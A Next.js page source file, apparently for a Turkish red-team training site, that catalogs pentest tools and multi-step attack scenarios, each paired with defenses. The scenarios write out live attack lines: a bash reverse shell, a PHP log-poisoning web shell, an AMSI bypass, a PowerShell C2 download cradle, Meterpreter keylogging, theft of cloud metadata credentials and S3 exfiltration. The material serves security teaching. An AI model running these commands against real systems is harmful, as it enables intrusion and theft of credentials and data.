"use client";
import Link from "next/link";
import { Shield, ArrowRight, ChevronDown, ChevronRight, Crosshair, GitBranch, Bug } from "lucide-react";
import { useState } from "react";
import { cn } from "@/lib/utils";

// ─── Araçlar (accordion kategorileri) ───────────────────────────────
const toolCategories = [
  {
    id: "bilgi-toplama",
    category: "Bilgi Toplama",
    emoji: "🔍",
    desc: "Pasif/aktif keşif — hedefi tanı, iz bırakma",
    items: [
      { slug: "osint-basics",                      title: "OSINT Temelleri",         desc: "WHOIS, DNS, crt.sh, Wayback — pasif keşif omurgası", level: "Başlangıç" },
      { slug: "osint-basics/shodan-ileri",          title: "Shodan İleri",            desc: "İnternete açık servis arama motoru — dork'lar, API, ICS/SCADA keşfi", level: "Orta" },
      { slug: "osint-basics/theharvester-maltego", title: "theHarvester & Maltego",  desc: "E-posta/çalışan toplama, Recon-ng, Maltego ilişki grafiği", level: "Orta" },
      { slug: "google-dorking",                     title: "Google Dorking",          desc: "İleri seviye arama operatörleriyle hassas veri keşfi", level: "Orta" },
      { slug: "amass",                              title: "Amass",                   desc: "OWASP subdomain enumeration — 50+ kaynak, ASN keşfi, CT logları", level: "Orta" },
      { slug: "recon-ng",                           title: "Recon-ng Framework",      desc: "Modüler OSINT framework — e-posta, kişi, subdomain, sosyal medya", level: "Orta" },
    ],
  },
  {
    id: "ag-kesfi",
    category: "Ağ Keşfi",
    emoji: "🗺️",
    desc: "Port tarama, servis enum, zafiyet tarama",
    items: [
      { slug: "nmap",       title: "Nmap",       desc: "Ping sweep'ten NSE script motoruna tam ağ tarama", level: "Başlangıç–İleri" },
      { slug: "enum4linux", title: "enum4linux", desc: "SMB/Samba enumeration — kullanıcı, paylaşım, parola politikası", level: "Başlangıç–Orta" },
      { slug: "nessus",     title: "Nessus",     desc: "Kurumsal zafiyet tarayıcı — CVE eşleştirme, doğrulama", level: "Başlangıç–Orta" },
    ],
  },
  {
    id: "web",
    category: "Web Uygulama Güvenliği",
    emoji: "🌐",
    desc: "Dizin keşfi, fuzzing, SQLi, Burp, CMS tarama",
    items: [
      { slug: "gobuster",         title: "Gobuster",               desc: "Dizin, dosya ve DNS alt alan keşfi", level: "Başlangıç" },
      { slug: "ffuf",             title: "ffuf",                   desc: "Hızlı web fuzzer — parametre, header ve yol testi", level: "Orta" },
      { slug: "sqlmap",           title: "SQLMap",                 desc: "SQL injection tespiti ve sömürüsü — WAF atlatmaya kadar", level: "Orta–İleri" },
      { slug: "burpsuite",        title: "Burp Suite",             desc: "Proxy, Repeater ve Intruder ile manuel web analizi", level: "Orta" },
      { slug: "nikto",            title: "Nikto",                  desc: "Web sunucu zafiyet ve yanlış yapılandırma tarayıcısı", level: "Başlangıç" },
      { slug: "wpscan",           title: "WPScan",                 desc: "WordPress eklenti, tema, kullanıcı zafiyet taraması", level: "Orta" },
      { slug: "web-exploitation", title: "Web Sömürü Teknikleri", desc: "LFI/RFI, dosya yükleme bypass, log poisoning, command injection", level: "Orta–İleri" },
      { slug: "xss",              title: "XSS — Cross-Site Scripting", desc: "Reflected/Stored/DOM XSS, cookie hırsızlığı, keylogger, CSP bypass", level: "Orta" },
    ],
  },
  {
    id: "shell-erisim",
    category: "Shell & Erişim",
    emoji: "💻",
    desc: "Reverse shell, TTY upgrade, dosya transferi",
    items: [
      { slug: "reverse-shells", title: "Reverse Shell & TTY", desc: "Bash/Python/PHP/PowerShell reverse shell + tam etkileşimli TTY", level: "Başlangıç–Orta" },
      { slug: "file-transfer",  title: "Dosya Transferi",     desc: "HTTP, certutil, SMB, scp ile hedefe/hedeften dosya aktarma", level: "Başlangıç–Orta" },
      { slug: "netcat",         title: "Netcat (nc)",         desc: "Ağın İsviçre çakısı — listener, reverse/bind shell, port scan, file transfer", level: "Başlangıç" },
    ],
  },
  {
    id: "parola",
    category: "Parola Saldırıları",
    emoji: "🔑",
    desc: "Online brute force, offline hash kırma",
    items: [
      { slug: "hydra",            title: "Hydra",                          desc: "Online brute force — SSH, FTP, HTTP, SMB form saldırıları", level: "Orta" },
      { slug: "john",             title: "John the Ripper",                desc: "Offline hash kırma, /etc/shadow ve özel format desteği", level: "Orta" },
      { slug: "hashcat",          title: "Hashcat",                        desc: "GPU hızlandırmalı hash kırma — NTLM, Kerberoast, WPA", level: "Orta–İleri" },
      { slug: "wordlist-uretimi", title: "Wordlist Üretimi (CeWL/Crunch)", desc: "Hedef odaklı wordlist — CeWL web crawler, Crunch pattern, CUPP kişisel", level: "Orta" },
    ],
  },
  {
    id: "exploitation",
    category: "Sömürü (Exploitation)",
    emoji: "💥",
    desc: "Public exploit, msfvenom, meterpreter",
    items: [
      { slug: "metasploit",   title: "Metasploit Framework",        desc: "Exploit, msfvenom payload üretimi ve meterpreter post-exploitation", level: "Orta–İleri" },
      { slug: "searchsploit", title: "Searchsploit & ExploitDB",    desc: "Offline CVE/exploit araması, PoC okuma, Metasploit yönlendirme", level: "Başlangıç–Orta" },
    ],
  },
  {
    id: "active-directory",
    category: "Active Directory & İç Ağ",
    emoji: "🏛️",
    desc: "AD saldırı zinciri — LLMNR'den Domain Admin'e",
    items: [
      { slug: "bloodhound", title: "BloodHound",            desc: "AD saldırı yollarını grafiksel haritalama — DA'ya en kısa yol", level: "İleri" },
      { slug: "responder",  title: "Responder",             desc: "LLMNR/NBT-NS zehirleme ile NetNTLMv2 hash yakalama", level: "İleri" },
      { slug: "netexec",    title: "NetExec (CME)",          desc: "İç ağ numaralandırma, Pass-the-Hash ve yanal hareket", level: "İleri" },
      { slug: "impacket",   title: "Impacket & Kerberos",   desc: "secretsdump, psexec, Kerberoasting, AS-REP Roasting", level: "İleri" },
    ],
  },
  {
    id: "post-exploit",
    category: "Post-Exploitation & PrivEsc",
    emoji: "⬆️",
    desc: "Root/SYSTEM'e yetki yükseltme, lateral, pivot",
    items: [
      { slug: "linux-privesc",   title: "Linux PrivEsc",        desc: "LinPEAS, SUID, Sudo, Cron — root'a her yol", level: "Orta–İleri" },
      { slug: "windows-privesc", title: "Windows PrivEsc",      desc: "WinPEAS, token impersonation, servis izinleri, unquoted path", level: "Orta–İleri" },
      { slug: "pivoting",        title: "Pivoting & Tunneling", desc: "SSH tünelleme, proxychains, chisel, ligolo ile iç ağa sıçrama", level: "İleri" },
    ],
  },
  {
    id: "sunucu-saldiri",
    category: "Sunucu Saldırıları",
    emoji: "🖥️",
    desc: "Linux/Windows Server, web ve DB sömürüsü",
    items: [
      { slug: "linux-server",     title: "Linux Server",          desc: "SSH/NFS/Samba sömürüsü, foothold'dan root'a", level: "Başlangıç–İleri" },
      { slug: "windows-server",   title: "Windows Server",        desc: "RDP/WinRM/SMB, credential dump, Domain Admin yolu", level: "Orta–İleri" },
      { slug: "web-servers",      title: "Web Sunucuları",        desc: "Apache/Nginx/IIS — path traversal, yanlış yapılandırma", level: "Orta" },
      { slug: "database-servers", title: "Veritabanı Sunucuları", desc: "MySQL/MSSQL — xp_cmdshell, hash çıkarma, RCE", level: "Orta–İleri" },
    ],
  },
  {
    id: "diger",
    category: "Cloud & Kablosuz & Mobil",
    emoji: "☁️",
    desc: "AWS/Azure, Wi-Fi, Android/iOS pentest",
    items: [
      { slug: "cloud-pentest",  title: "Cloud Pentest",        desc: "S3 bucket, IAM enum, metadata SSRF, ScoutSuite, Pacu", level: "Orta–İleri" },
      { slug: "wifi-pentest",   title: "Wi-Fi Güvenlik Testi", desc: "Monitor mod, handshake yakalama, Evil Twin, Enterprise", level: "Orta–İleri" },
      { slug: "mobile-pentest", title: "Mobil Uygulama",       desc: "APK analizi, Burp araya girme, SSL Pinning bypass, Frida", level: "Orta–İleri" },
    ],
  },
  {
    id: "raporlama",
    category: "Raporlama & Kariyer",
    emoji: "📋",
    desc: "Pentest raporu yazımı, CVSS puanlama, kariyer gelişimi",
    items: [
      { slug: "pentest-raporlama", title: "Pentest Raporlama", desc: "Executive summary, CVSS v3.1, bulgu şablonu, kanıt portfolyosu", level: "Tüm Seviyeler" },
    ],
  },
];

// ─── Saldırı Senaryoları ─────────────────────────────────────────────
const scenarioCategories = [
  {
    id: "web-klasik",
    label: "Web Uygulama",
    emoji: "🌐",
    scenarios: [
      {
        id: "nmap-smb",
        title: "Recon → SQLi Keşfi → DB Dump → OS Shell",
        difficulty: "Orta",
        diffColor: "amber",
        target: "Web Uygulaması + MSSQL/MySQL Sunucu",
        desc: "SQL injection'dan tablo dump'a, oradan OS komut yürütmeye — OWASP A03 saldırı omurgası.",
        chain: [
          { step: "1", label: "Parametre Fuzzing",   tool: "ffuf + Burp",       href: "/red-team/ffuf",             detail: "ffuf -u 'http://IP/page.php?id=FUZZ' -w sql-payloads.txt → hata mesajı veya yanıt boyutu farkı" },
          { step: "2", label: "SQLi Doğrulama",      tool: "Burp Repeater",     href: "/red-team/burpsuite",        detail: "' OR '1'='1-- → giriş başarılı | ' AND 1=2-- → farklı yanıt → Boolean-based blind onayı" },
          { step: "3", label: "Otomatik Sömürü",     tool: "SQLMap",            href: "/red-team/sqlmap",           detail: "sqlmap -u 'http://IP/page.php?id=1' --dbs → DB listesi → --dump -D db -T users → hash'ler" },
          { step: "4", label: "Hash Kırma",          tool: "Hashcat / John",    href: "/red-team/hashcat",          detail: "hashcat -m 0 (MD5) veya -m 3200 (bcrypt) → düz parola → /admin paneline giriş" },
          { step: "5", label: "OS Shell",            tool: "SQLMap --os-shell", href: "/red-team/sqlmap",           detail: "MSSQL: sqlmap --os-shell → xp_cmdshell etkin → whoami: nt authority\\system" },
          { step: "6", label: "PrivEsc",             tool: "WinPEAS",           href: "/red-team/windows-privesc",  detail: "Servis SYSTEM değilse winpeas → SeImpersonate → PrintSpoofer → SYSTEM shell" },
        ],
        defense: "Prepared statement kullan (SQLi'nin tek kesin çözümü). xp_cmdshell kapalı tut. DB hesabına minimum yetki. WAF + hata mesajlarını kullanıcıya gösterme.",
      },
      {
        id: "web-lfi-rce",
        title: "Recon → LFI → Log Poisoning → RCE → Root",
        difficulty: "Orta",
        diffColor: "amber",
        target: "Linux Web Sunucu (Apache + PHP)",
        desc: "Dizin keşfinden Local File Inclusion'a, log dosyası zehirleme yoluyla uzaktan kod yürütmeye — CTF'lerin vazgeçilmezi.",
        chain: [
          { step: "1", label: "Keşif & Teknoloji",  tool: "Nikto + Nmap",        href: "/red-team/nikto",            detail: "nmap -sV -p 80,443 IP + nikto -h IP → PHP sürümü, dizin listeleme, hata sayfaları" },
          { step: "2", label: "Dizin & Parametre",  tool: "Gobuster / ffuf",      href: "/red-team/gobuster",         detail: "gobuster dir -u http://IP -w common.txt → /?page= parametresi, /backup, /admin" },
          { step: "3", label: "LFI Tespiti",        tool: "Burp Suite + Manuel",  href: "/red-team/burpsuite",        detail: "?page=../../../../etc/passwd → LFI onayı. php://filter/convert.base64-encode/resource=index.php → kaynak kodu" },
          { step: "4", label: "Log Poisoning",      tool: "Web Exploitation",     href: "/red-team/web-exploitation", detail: "User-Agent: <?php system($_GET['cmd']); ?> → LFI ile /var/log/apache2/access.log yükle → RCE" },
          { step: "5", label: "Reverse Shell",      tool: "Reverse Shells",       href: "/red-team/reverse-shells",   detail: "?cmd=bash -c 'bash -i >& /dev/tcp/KALI/4444 0>&1' → nc -lvnp 4444 → www-data shell" },
          { step: "6", label: "Linux PrivEsc",      tool: "LinPEAS",              href: "/red-team/linux-privesc",    detail: "linpeas.sh → sudo -l → GTFOBins (vim/find/python) veya SUID binary → root" },
        ],
        defense: "Dosya yoluna kullanıcı girdisi dahil etme. PHP: allow_url_include=Off. Web sunucusunu en az yetki ile çalıştır. ModSecurity LFI imzaları. Log dosyalarına dışarıdan yazma engellensin.",
      },
    ],
  },
  {
    id: "web-ileri",
    label: "Gelişmiş Web Saldırıları",
    emoji: "🕷️",
    scenarios: [
      {
        id: "ssrf-metadata",
        title: "SSRF Discovery → Internal Port Scan → AWS Metadata → IAM Credential Theft",
        difficulty: "İleri",
        diffColor: "red",
        target: "Cloud-hosted Web App (AWS EC2)",
        desc: "Uygulama üzerindeki SSRF zafiyeti, sunucunun bulut meta-data servisine (169.254.169.254) erişmesini sağlayarak IAM rolüne bağlı geçici AWS credential'larını çalar — içeriden dışarıya bulut ele geçirme.",
        chain: [
          { step: "1", label: "SSRF Parametre Tespiti", tool: "Burp Suite + ffuf",    href: "/red-team/burpsuite",        detail: "Burp Collaborator veya interactsh ile url= / path= / dest= parametrelerini test et → out-of-band DNS hit" },
          { step: "2", label: "Internal Port Scan",     tool: "Web Exploitation",     href: "/red-team/web-exploitation", detail: "SSRF ile http://127.0.0.1:FUZZ → ffuf ile tüm portları tara → Redis (6379), Elasticsearch (9200), iç API'ler" },
          { step: "3", label: "Metadata Endpoint",      tool: "Cloud Pentest",        href: "/red-team/cloud-pentest",    detail: "http://169.254.169.254/latest/meta-data/iam/security-credentials/ → IAM role adını öğren" },
          { step: "4", label: "Credential Exfiltration",tool: "Cloud Pentest",        href: "/red-team/cloud-pentest",    detail: "http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE → AccessKeyId + SecretAccessKey + Token" },
          { step: "5", label: "AWS Enum & PrivEsc",     tool: "Cloud Pentest",        href: "/red-team/cloud-pentest",    detail: "aws sts get-caller-identity → aws iam list-attached-user-policies → Pacu ile iam:AttachUserPolicy → AdministratorAccess" },
          { step: "6", label: "Lateral → Data Exfil",  tool: "Cloud Pentest",        href: "/red-team/cloud-pentest",    detail: "aws s3 ls → aws s3 sync s3://bucket /tmp/loot | aws rds describe-db-instances → snapshot export" },
        ],
        defense: "IMDSv2'ye geçiş yap (token tabanlı — SSRF ile direkt erişim kırılır). SSRF'e karşı URL allowlist kullan. IAM rolüne en az yetki (least privilege). VPC endpoint + metadata'ya erişim kısıtla.",
      },
      {
        id: "api-jwt-idor",
        title: "API Recon → JWT Algorithm Confusion → IDOR → Admin Takeover",
        difficulty: "İleri",
        diffColor: "red",
        target: "REST API Backend (Node.js / Python)",
        desc: "API keşfinden JWT algoritma karışıklığı saldırısına (alg:none / RS256→HS256) geçerek imzasız token oluşturulur, IDOR ile admin endpoint'leri ele geçirilir — modern web'in en kritik kombinasyonu.",
        chain: [
          { step: "1", label: "API Endpoint Keşfi",    tool: "ffuf + Gobuster",     href: "/red-team/gobuster",         detail: "ffuf -u http://API/FUZZ -w api-wordlist.txt → /api/v1/users, /api/admin, /api/v2/internal" },
          { step: "2", label: "JWT Analizi",           tool: "Burp Suite",          href: "/red-team/burpsuite",        detail: "Authorization: Bearer <token> → jwt.io'da decode et → alg: RS256, sub: user_id: 42" },
          { step: "3", label: "Algorithm Confusion",   tool: "Web Exploitation",    href: "/red-team/web-exploitation", detail: "alg: 'none' dene → imzasız token kabul edilirse admin. RS256→HS256: public key ile HMAC imzala → sunucu kabul eder" },
          { step: "4", label: "Privilege Escalation",  tool: "Burp Repeater",       href: "/red-team/burpsuite",        detail: "Token payload'ında role:'user' → role:'admin', user_id:42 → user_id:1 → /api/admin endpoint'lerine eriş" },
          { step: "5", label: "IDOR → Mass Data",      tool: "Burp Intruder",       href: "/red-team/burpsuite",        detail: "GET /api/v1/users/FUZZ → Intruder ile 1'den 9999'e user ID brute → tüm kullanıcı PII sızdır" },
          { step: "6", label: "Account Takeover",      tool: "Web Exploitation",    href: "/red-team/web-exploitation", detail: "PATCH /api/v1/users/1/password → admin parolasını değiştir → admin paneline tam erişim" },
        ],
        defense: "JWT imzalamayı asymmetric key ile yap, algoritma client'tan gelmesin (sunucu tarafında sabit). IDOR'a karşı her obje erişiminde server-side ownership kontrolü. Rate limiting ve anomali tespiti.",
      },
    ],
  },
  {
    id: "ad-ileri",
    label: "Active Directory & İç Ağ",
    emoji: "🏛️",
    scenarios: [
      {
        id: "ntlm-relay",
        title: "SMB Signing Check → NTLM Relay → SAM Dump → Pass-the-Hash → DA",
        difficulty: "İleri",
        diffColor: "red",
        target: "Active Directory (SMB Signing Disabled)",
        desc: "SMB imzalamanın devre dışı olduğu ağda, NTLM kimlik doğrulaması başka bir hedefe yönlendirilerek (relay) credential'sız local admin elde edilir ve Pass-the-Hash ile Domain Admin'e ulaşılır.",
        chain: [
          { step: "1", label: "SMB Signing Kontrolü", tool: "Nmap / NetExec",       href: "/red-team/netexec",    detail: "netexec smb 192.168.1.0/24 --gen-relay-list targets.txt → signing:False olan tüm makineler listelenir" },
          { step: "2", label: "Relay Kurulumu",       tool: "Responder",             href: "/red-team/responder",  detail: "responder.conf: SMB=Off, HTTP=Off → python Responder.py -I eth0 -dPv (relay için SMB kapalı olmalı!)" },
          { step: "3", label: "NTLM Relay",           tool: "impacket ntlmrelayx",   href: "/red-team/impacket",   detail: "ntlmrelayx.py -tf targets.txt -smb2support → kurban kimlik doğrulaması gelince hedefe ilet → SAM dump" },
          { step: "4", label: "Local Hash Dump",      tool: "impacket secretsdump",  href: "/red-team/impacket",   detail: "SAM: Administrator:500:aad3...:8a4b... → tüm local hesap NTLM hash'leri elde edildi" },
          { step: "5", label: "Pass-the-Hash Spray",  tool: "NetExec",               href: "/red-team/netexec",    detail: "netexec smb 192.168.1.0/24 -u Administrator -H 8a4b... --local-auth → Pwn3d! olan makineler" },
          { step: "6", label: "DCSync → DA",          tool: "impacket secretsdump",  href: "/red-team/impacket",   detail: "Ele geçirilen makinede DA oturumu varsa (BloodHound HasSession) → secretsdump → krbtgt hash → DA" },
        ],
        defense: "Tüm ağda SMB imzalamayı zorunlu kıl (GPO: 'Microsoft network server: Digitally sign communications always'). LAPS ile local admin parolalarını farklılaştır. Event ID 4624 (Logon Type 3) anomalilerini izle.",
      },
      {
        id: "unconstrained-delegation",
        title: "BloodHound → Unconstrained Delegation → Printer Bug → TGT Capture → DA",
        difficulty: "İleri",
        diffColor: "red",
        target: "Active Directory (Kısıtsız Delegasyon yapılandırılmış sunucu)",
        desc: "Kısıtsız delegasyon yetkisi olan sunucuyu BloodHound ile tespit edip, Printer Bug (SpoolSample) ile DC'yi o sunucuya kimlik doğrulamaya zorlayarak DC'nin TGT'sini çalar ve Domain Admin yetkisi kazanırsın.",
        chain: [
          { step: "1", label: "AD Haritalama",         tool: "BloodHound",             href: "/red-team/bloodhound",  detail: "bloodhound-python -c All → 'Unconstrained Delegation' düğümlerini bul → SRV01 işaretli" },
          { step: "2", label: "SRV01'e Giriş",         tool: "NetExec / evil-winrm",   href: "/red-team/netexec",     detail: "Ele geçirilmiş hesapla SRV01'e WinRM veya PsExec ile gir → TGT monitoring başlat (Rubeus monitor)" },
          { step: "3", label: "TGT İzleme",            tool: "impacket",               href: "/red-team/impacket",    detail: "Rubeus.exe monitor /interval:5 /nowrap → gelen TGT'leri base64 olarak yakala, hazır bekle" },
          { step: "4", label: "Printer Bug (SpoolSample)", tool: "impacket",           href: "/red-team/impacket",    detail: "printerbug.py domain/user:pass@DC01 SRV01 → DC01'i SRV01'e SMB kimlik doğrulaması yapmaya zorla" },
          { step: "5", label: "DC TGT Yakalama",       tool: "impacket",               href: "/red-team/impacket",    detail: "Rubeus monitor çıktısında DC01$ hesabının TGT'si gelir → Rubeus ptt /ticket:BASE64 → ticket inject" },
          { step: "6", label: "DCSync → DA",           tool: "impacket secretsdump",   href: "/red-team/impacket",    detail: "DC01$ TGT ile secretsdump.py -k -no-pass DC01 → tüm hash'ler → Administrator NTLM → DA" },
        ],
        defense: "Kısıtsız delegasyonu kaldır, gerekiyorsa Constrained veya Resource-Based Constrained Delegation kullan. MS-RPRN (Spooler servisi) kapalı tut. Protected Users grubunu kullan — TGT delegasyona izin vermez.",
      },
    ],
  },
  {
    id: "initial-access",
    label: "Initial Access & Sosyal Mühendislik",
    emoji: "🎣",
    scenarios: [
      {
        id: "phishing-macro-c2",
        title: "OSINT → Spear Phishing → Malicious Macro → AMSI Bypass → C2 Beacon",
        difficulty: "İleri",
        diffColor: "red",
        target: "Windows İş İstasyonu (Kurumsal ağ)",
        desc: "Kurban profili çıkarılan hedef kişiye gönderilen spear phishing e-postasındaki zararlı Office makrosu, AMSI'yi atlayarak bellekte çalışır ve C2 bağlantısı kurar — Red Team'in en sık kullandığı initial access vektörü.",
        chain: [
          { step: "1", label: "OSINT & Profil",       tool: "OSINT Temelleri",      href: "/red-team/osint-basics",     detail: "LinkedIn → departman/unvan/araçlar | theHarvester → kurumsal e-posta formatı | Shodan → mail gateway" },
          { step: "2", label: "Spear Phishing",       tool: "theHarvester & Maltego",href: "/red-team/osint-basics/theharvester-maltego", detail: "Hedefin yöneticisini taklit eden domain (homoglyph/typosquatting) + kişiselleştirilmiş içerik ile mail gönder" },
          { step: "3", label: "Macro Hazırlama",      tool: "Metasploit",           href: "/red-team/metasploit",       detail: "msfvenom -p windows/x64/meterpreter/reverse_https LHOST=... -f vba → Office makrosu içine göm, AutoOpen" },
          { step: "4", label: "AMSI Bypass",          tool: "Web Exploitation",     href: "/red-team/web-exploitation", detail: "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed',...).SetValue($null,$true)" },
          { step: "5", label: "C2 Beacon",            tool: "Reverse Shells",       href: "/red-team/reverse-shells",   detail: "PowerShell cradle: IEX(New-Object Net.WebClient).DownloadString('http://C2/stager') → meterpreter oturumu" },
          { step: "6", label: "Persistence + Pivot",  tool: "NetExec",              href: "/red-team/netexec",          detail: "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run → iç ağda netexec ile yatay hareket" },
        ],
        defense: "Makroları varsayılan kapalı tut (GPO: 'Disable all macros without notification'). Anti-phishing eğitimi + DMARC/DKIM. EDR ile PowerShell script block logging (Event 4104). Outbound HTTPS trafiğini proxy üzerinden geçir.",
      },
      {
        id: "drive-by-meterpreter",
        title: "Recon → Drive-by Download → Browser Exploit → Meterpreter → Keylogger",
        difficulty: "Orta",
        diffColor: "amber",
        target: "Windows İş İstasyonu (Güncel olmayan tarayıcı/eklenti)",
        desc: "Kurbanın ziyaret ettiği bir web sayfasına yerleştirilen kötü amaçlı içerik, güncel olmayan tarayıcı eklentisini (Java/Flash/PDF) sömürerek kullanıcı etkileşimi olmadan Meterpreter oturumu başlatır.",
        chain: [
          { step: "1", label: "Hedef Profil",         tool: "OSINT Temelleri",    href: "/red-team/osint-basics",    detail: "Hedefin hangi siteleri ziyaret ettiğini öğren (çalıştığı şirketin partner portalı, sektör forumu vb.)" },
          { step: "2", label: "Watering Hole Hazırlık",tool: "Metasploit",        href: "/red-team/metasploit",      detail: "msfvenom -p windows/meterpreter/reverse_tcp -f exe → web sunucuya koy, JS yönlendirmesi ekle" },
          { step: "3", label: "Browser Exploit",      tool: "Metasploit",         href: "/red-team/metasploit",      detail: "use exploit/multi/browser/java_signed_applet → SRVHOST set → hedef siteyi ziyaret edince otomatik tetikle" },
          { step: "4", label: "Meterpreter Oturumu",  tool: "Metasploit",         href: "/red-team/metasploit",      detail: "sessions -i 1 → sysinfo → getuid → migrate explorer.exe (kararlılık için süreç göçü)" },
          { step: "5", label: "Keylogger + Harvest",  tool: "Metasploit",         href: "/red-team/metasploit",      detail: "keyscan_start → 5 dk bekle → keyscan_dump → kurumsal VPN/e-posta credential'ları" },
          { step: "6", label: "Persistence",          tool: "Windows PrivEsc",    href: "/red-team/windows-privesc", detail: "run post/windows/manage/persistence_exe → HKLM run key veya scheduled task → reboot sonrası da bağlı" },
        ],
        defense: "Tarayıcıyı ve tüm eklentileri güncel tut. Java/Flash tamamen kaldır. Web filtreleme (kategorize edilmemiş / şüpheli domain'ler engelle). EDR davranışsal analizi. Uygulama whitelist (AppLocker/WDAC).",
      },
    ],
  },
  {
    id: "cloud-privesc",
    label: "Cloud Sızma Testi",
    emoji: "☁️",
    scenarios: [
      {
        id: "s3-hardcoded-iam",
        title: "S3 Bucket Recon → Source Code Leak → Hardcoded Keys → IAM PrivEsc → Admin",
        difficulty: "Orta",
        diffColor: "amber",
        target: "AWS Ortamı (Misconfigured S3 + IAM)",
        desc: "Herkese açık S3 kovası içindeki kaynak kod veya yapılandırma dosyasında bulunan hardcoded AWS anahtarları, IAM politika ekleme zafiyetiyle Administrator erişimine yükseltilir — bulut pentestinin en yaygın bulgusu.",
        chain: [
          { step: "1", label: "S3 Bucket Keşfi",      tool: "Cloud Pentest",       href: "/red-team/cloud-pentest",   detail: "Google dork: site:s3.amazonaws.com ŞIRKET | grayhatwarfare.com | aws s3 ls s3://şirket-backup --no-sign-request" },
          { step: "2", label: "Public Bucket Okuma",  tool: "Cloud Pentest",       href: "/red-team/cloud-pentest",   detail: "aws s3 sync s3://hedef-bucket /tmp/loot --no-sign-request → config/, .env, application.properties indir" },
          { step: "3", label: "Credential Analizi",   tool: "Google Dorking",      href: "/red-team/google-dorking",  detail: "grep -rn 'AKIA' /tmp/loot → AWS Access Key (AKIA ile başlar) + Secret Key → trufflehog ile tarama" },
          { step: "4", label: "IAM Enum",             tool: "Cloud Pentest",       href: "/red-team/cloud-pentest",   detail: "aws sts get-caller-identity → aws iam list-attached-user-policies → aws iam simulate-principal-policy" },
          { step: "5", label: "IAM PrivEsc",          tool: "Cloud Pentest",       href: "/red-team/cloud-pentest",   detail: "iam:AttachUserPolicy hakkı varsa → aws iam attach-user-policy --policy-arn arn:aws:iam::aws:policy/AdministratorAccess" },
          { step: "6", label: "Full AWS Erişimi",     tool: "Cloud Pentest",       href: "/red-team/cloud-pentest",   detail: "Admin → tüm S3 bucket'lar, RDS snapshot, EC2 → Lambda içinde credential taraması → cross-account pivot" },
        ],
        defense: "Tüm S3 bucket'larda public access block aktif et. Kodda hardcoded credential yasak (pre-commit hook: detect-secrets). IAM rollerine minimum yetki. AWS Config ile bucket policy değişikliklerini izle. CloudTrail aktif.",
      },
      {
        id: "ecr-supply-chain",
        title: "ECR Public Image → Secrets in Layer → ECS Task Role → S3 Exfil",
        difficulty: "İleri",
        diffColor: "red",
        target: "AWS Konteyner Ortamı (ECR + ECS + IAM)",
        desc: "Herkese açık container image katmanlarında gömülü kalan sertifika veya API anahtarı, ECS task üzerindeki aşırı yetkili IAM rolüyle birleşince tüm S3 ve RDS'e erişim imkânı doğurur — supply chain ve cloud privilege escalation kombinasyonu.",
        chain: [
          { step: "1", label: "ECR Image Keşfi",      tool: "Cloud Pentest",       href: "/red-team/cloud-pentest",   detail: "docker pull public.ecr.aws/şirket/app:latest → docker history → hangi katmanlarda ne var?" },
          { step: "2", label: "Image Layer Analizi",  tool: "Cloud Pentest",       href: "/red-team/cloud-pentest",   detail: "dive image:tag veya docker save | tar x → her katmanı aç, .env / id_rsa / .aws/credentials ara" },
          { step: "3", label: "Credential Çıkarma",  tool: "Cloud Pentest",       href: "/red-team/cloud-pentest",   detail: "Katmanda COPY .env → eski API key veya DB parolası. git log layer içindeyse geçmiş commit'lerde credential kalabilir" },
          { step: "4", label: "ECS Metadata Enum",   tool: "Web Exploitation",    href: "/red-team/web-exploitation", detail: "Konteyner içindeyken: curl http://169.254.170.2/v2/credentials/ → ECS Task Role'ün geçici token'ları" },
          { step: "5", label: "IAM Role Abuse",      tool: "Cloud Pentest",       href: "/red-team/cloud-pentest",   detail: "Çalınan token ile: aws s3 ls → aws rds describe-db-instances → aws secretsmanager list-secrets" },
          { step: "6", label: "Data Exfiltration",   tool: "Cloud Pentest",       href: "/red-team/cloud-pentest",   detail: "aws s3 sync s3://production-data /tmp/exfil → Secrets Manager'dan DB parolası al → RDS'e doğrudan bağlan" },
        ],
        defense: "Docker build'de multi-stage kullan (son image'da secret kalmasın). .dockerignore ile .env dosyalarını dışla. ECR image scanning aktif et. ECS Task Role'ü minimum yetki ile oluştur. Secrets Manager / Parameter Store kullan, asla ENV ile.",
      },
    ],
  },
  {
    id: "privesc",
    label: "Privilege Escalation",
    emoji: "⬆️",
    scenarios: [
      {
        id: "linux-sudo-suid",
        title: "Foothold → sudo -l → GTFOBins → Root → /etc/shadow Dump",
        difficulty: "Orta",
        diffColor: "amber",
        target: "Linux Sunucu (Yanlış yapılandırılmış sudo/SUID)",
        desc: "Düşük yetkili shell'den sudo yanlış yapılandırması veya SUID binary üzerinden root'a yükseltme ve /etc/shadow dump ile tüm sistem parolalarını elde etme — Linux CTF'lerinin ve gerçek iç ağların en sık bulgusu.",
        chain: [
          { step: "1", label: "Foothold",             tool: "Reverse Shells",     href: "/red-team/reverse-shells",   detail: "Herhangi bir saldırı vektöründen www-data veya düşük yetkili kullanıcı shell'i → python3 -c pty spawn" },
          { step: "2", label: "Sistem Enum",          tool: "LinPEAS",            href: "/red-team/linux-privesc",    detail: "curl -sL https://linpeas.sh | sh → sarı/kırmızı bulgular: sudo -l, SUID, yazılabilir /etc/cron.d" },
          { step: "3", label: "sudo -l Analizi",      tool: "Linux PrivEsc",      href: "/red-team/linux-privesc",    detail: "sudo -l → (ALL) NOPASSWD: /usr/bin/vim → gtfobins.github.io/gtfobins/vim/ → sudo vim -c ':!/bin/bash'" },
          { step: "4", label: "SUID Bypass (Alternatif)", tool: "Linux PrivEsc", href: "/red-team/linux-privesc",    detail: "find / -perm -4000 2>/dev/null → /usr/bin/find SUID ise: find . -exec /bin/sh -p \\; → root shell" },
          { step: "5", label: "Root Shell",           tool: "Linux PrivEsc",      href: "/red-team/linux-privesc",    detail: "id → uid=0(root) → cat /root/root.txt → /etc/shadow okunabilir → tüm kullanıcı hash'leri" },
          { step: "6", label: "Credential Dump",      tool: "Hashcat / John",     href: "/red-team/hashcat",          detail: "cat /etc/shadow → john shadow.txt --wordlist=rockyou.txt → kırılan parolalar ile pivot" },
        ],
        defense: "sudo'da sadece gerekli komutlara izin ver, asla ALL:ALL. SUID bitlerini düzenli denetle (find / -perm -4000). Cron script'lerinin sahibini ve yazma iznini kontrol et. AppArmor / SELinux ile süreci sınırla.",
      },
      {
        id: "windows-token-impersonation",
        title: "Low Priv Shell → whoami /priv → SeImpersonate → PrintSpoofer → SYSTEM → Mimikatz",
        difficulty: "İleri",
